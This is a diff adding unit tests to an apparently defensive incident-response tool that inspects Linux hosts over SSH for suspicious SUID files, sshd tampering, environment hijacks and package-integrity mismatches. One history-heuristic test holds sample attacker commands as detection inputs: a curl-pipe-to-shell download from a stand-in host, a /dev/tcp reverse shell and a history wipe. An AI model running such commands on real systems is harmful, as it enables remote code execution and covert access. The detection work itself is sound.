@@ -453,5 +453,216 @@ class PermissionPropagationTests(unittest.TestCase):
         self.assertTrue(any('[TRUNCATED]' in warning for warning in warnings))
 
 
+class FindOutputTests(unittest.TestCase):
+    def test_find_stderr_marker_is_split(self):
+        data, errors = server.split_find_output(
+            'file one\nfile two\n@@AUTOIR_FIND_STDERR@@\nfind: /x: Permission denied\n'
+        )
+
+        self.assertEqual(data, 'file one\nfile two')
+        self.assertIn('Permission denied', errors)
+
+    def test_missing_marker_keeps_plain_output(self):
+        data, errors = server.split_find_output('file one\n')
+
+        self.assertEqual(data, 'file one')
+        self.assertEqual(errors, '')
+
+    def test_printf_fallback_is_recognized(self):
+        self.assertTrue(server.find_printf_fallback_error('find: unrecognized: -printf'))
+        self.assertFalse(server.find_printf_fallback_error('find: Permission denied'))
+
+
+class RealWorldSemanticsTests(unittest.TestCase):
+    def tearDown(self):
+        server.ssh_session.client = None
+
+    def _run(self, tool, stdout=b'', stderr=b'', exit_status=0, **kwargs):
+        channel = FakeChannel([stdout], [stderr], exit_status=exit_status)
+        server.ssh_session.client = FakeClient(channel)
+        return tool(**kwargs)
+
+    def test_allowlisted_suid_is_not_reported_as_backdoor(self):
+        output = self._run(
+            server.check_setuid,
+            b'-rwsr-xr-x root:root /usr/bin/passwd\n',
+        )
+
+        self.assertIn('[i]', output)
+        self.assertNotIn('SUID 后门', output)
+
+    def test_unusual_suid_requires_manual_review(self):
+        output = self._run(
+            server.check_setuid,
+            b'-rwsr-xr-x root:root /opt/unknown-helper\n',
+        )
+
+        self.assertIn('[!] 非典型 SUID', output)
+
+    def test_suid_owned_by_non_root_is_flagged(self):
+        output = self._run(
+            server.check_setuid,
+            b'-rwsr-xr-x daemon:daemon /usr/bin/passwd\n',
+        )
+
+        self.assertIn('属主非 root', output)
+
+    def test_tmp_executable_and_regular_file_are_distinguished(self):
+        output = self._run(
+            server.check_tmp,
+            b'/tmp/run.sh\troot:root\t755\t12 bytes\t2026-10-19 10:00\n'
+            b'/tmp/readme\troot:root\t644\t12 bytes\t2026-10-19 10:00\n',
+        )
+
+        lines = output.splitlines()
+        self.assertIn('[!] /tmp 可执行文件', lines[0])
+        self.assertIn('[i] /tmp 文件', lines[1])
+
+    def test_deleted_exe_permission_error_is_not_clean(self):
+        output = self._run(
+            server.check_deleted_exe,
+            b'',
+            b'ls: cannot access /proc/1/exe: Permission denied\n',
+            exit_status=2,
+        )
+
+        self.assertIn('[PERMISSION]', output)
+
+    def test_sshd_missing_is_reported_as_not_found(self):
+        output = self._run(
+            server.check_ssh,
+            b"ls: cannot access '/usr/sbin/sshd': No such file or directory\n",
+            exit_status=2,
+        )
+
+        self.assertIn('[NOT_FOUND]', output)
+        self.assertNotIn('已被劫持', output)
+
+    def test_sshd_symlink_requires_review_not_hijack(self):
+        output = self._run(
+            server.check_ssh,
+            b'lrwxrwxrwx 1 root root 4 Oct 19 10:00 /usr/sbin/sshd -> sshd\n',
+        )
+
+        self.assertIn('[i]', output)
+        self.assertIn('需人工复核', output)
+        self.assertNotIn('已被劫持', output)
+
+    def test_printf_fallback_is_reported_without_hiding_permission_error(self):
+        output = self._run(
+            server.check_recent_files,
+            b'/tmp/new.sh\troot:root\t755\t12 bytes\t2026-10-19 10:00\n'
+            b'@@AUTOIR_FIND_STDERR@@\nfind: /tmp/locked: Permission denied\n',
+            path='/tmp',
+        )
+
+        self.assertIn('/tmp/new.sh', output)
+        self.assertIn('[PERMISSION]', output)
+
+    def test_missing_recent_files_path_is_not_reported_as_empty(self):
+        output = self._run(
+            server.check_recent_files,
+            b'@@AUTOIR_FIND_STDERR@@\nfind: /srv/missing: No such file or directory\n',
+            path='/srv/missing',
+        )
+
+        self.assertIn('[NOT_FOUND]', output)
+        self.assertNotIn('未发现变更文件', output)
+
+
+class WebrootRetentionTests(unittest.TestCase):
+    def test_stale_webroot_run_is_pruned_only_when_enabled(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            run = server.Path(tmp) / 'downloads' / '2026_01_01_00_00_00_000000_abcdef12'
+            run.mkdir(parents=True)
+            old = server.time.time() - 10 * 86400
+            server.os.utime(run, (old, old))
+
+            with mock.patch.object(server, 'base_dir', tmp):
+                server.prune_stale_webshell_runs(max_age_days=0)
+                self.assertTrue(run.exists())
+                server.prune_stale_webshell_runs(max_age_days=7)
+
+            self.assertFalse(run.exists())
+
+
+class IncidentResponseHeuristicTests(unittest.TestCase):
+    def test_history_flags_download_and_execute(self):
+        reason = server.history_suspicious_reason('curl -fsSL http://evil/a.sh | sh')
+
+        self.assertIn('shell', reason)
+
+    def test_history_flags_history_cleanup_and_reverse_shell(self):
+        self.assertIn('历史记录', server.history_suspicious_reason('history -c'))
+        self.assertIn('反弹', server.history_suspicious_reason('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'))
+
+    def test_history_allows_ordinary_commands(self):
+        self.assertIsNone(server.history_suspicious_reason('systemctl status nginx'))
+        self.assertIsNone(server.history_suspicious_reason('grep -r error /var/log/nginx'))
+
+    def test_package_integrity_tags_binary_and_config_differences(self):
+        self.assertIn('[!]', server.package_integrity_tag('S.5....T.  /usr/bin/ls', 'rpm'))
+        self.assertIn('缺失', server.package_integrity_tag('missing   /usr/bin/curl', 'rpm'))
+        self.assertIn('[i]', server.package_integrity_tag('..5....T. c /etc/ssh/sshd_config', 'rpm'))
+
+    def test_check_export_flags_preload_and_suspicious_path(self):
+        original_session = server.ssh_session
+        server.ssh_session = server.SSHSession()
+        try:
+            server.check_export('/root/.bashrc', 'export LD_PRELOAD=/tmp/x.so\n'
+                                                  'PATH="/usr/local/sbin:/usr/local/bin:/usr/bin"\n'
+                                                  'PATH="/usr/bin:/tmp"\n'
+                                                  'BASH_ENV=/dev/shm/env\n')
+            output = '\n'.join(server.ssh_session.hijack_output)
+        finally:
+            server.ssh_session = original_session
+
+        self.assertIn('LD_PRELOAD', output)
+        self.assertIn('BASH_ENV', output)
+        self.assertIn('/tmp', output)
+        self.assertEqual(output.count('PATH 包含可疑目录'), 1)
+
+    def test_check_package_integrity_reports_binary_mismatch(self):
+        nonce = 'testnonce'
+        payload = (
+            f'@@AUTOIR_PKG:{nonce}:MGR@@rpm\n'
+            'S.5....T.  /usr/bin/ls\n'
+            '..5....T. c /etc/ssh/sshd_config\n'
+            f'@@AUTOIR_PKG:{nonce}:LINES@@\n2\n'
+            f'@@AUTOIR_PKG:{nonce}:ERR@@\n'
+            f'@@AUTOIR_PKG:{nonce}:RC@@1\n'
+        )
+        channel = FakeChannel([payload.encode()], [], exit_status=1)
+        server.ssh_session.client = FakeClient(channel)
+        try:
+            with mock.patch.object(server, 'get_run_id', return_value=nonce):
+                output = server.check_package_integrity()
+        finally:
+            server.ssh_session.client = None
+
+        self.assertIn('[!] 系统可执行文件/库', output)
+        self.assertIn('/etc/ssh/sshd_config', output)
+        self.assertIn('[i]', output)
+
+    def test_check_package_integrity_without_package_manager_is_explicit(self):
+        nonce = 'testnonce'
+        payload = (
+            f'@@AUTOIR_PKG:{nonce}:MGR@@none\n'
+            f'@@AUTOIR_PKG:{nonce}:LINES@@\n0\n'
+            f'@@AUTOIR_PKG:{nonce}:ERR@@\nrpm/dpkg not found\n'
+            f'@@AUTOIR_PKG:{nonce}:RC@@127\n'
+        )
+        channel = FakeChannel([payload.encode()], [], exit_status=0)
+        server.ssh_session.client = FakeClient(channel)
+        try:
+            with mock.patch.object(server, 'get_run_id', return_value=nonce):
+                output = server.check_package_integrity()
+        finally:
+            server.ssh_session.client = None
+
+        self.assertIn('未检测到 rpm/dpkg', output)
+        self.assertIn('需人工复核', output)
+
+
 if __name__ == '__main__':
     unittest.main()
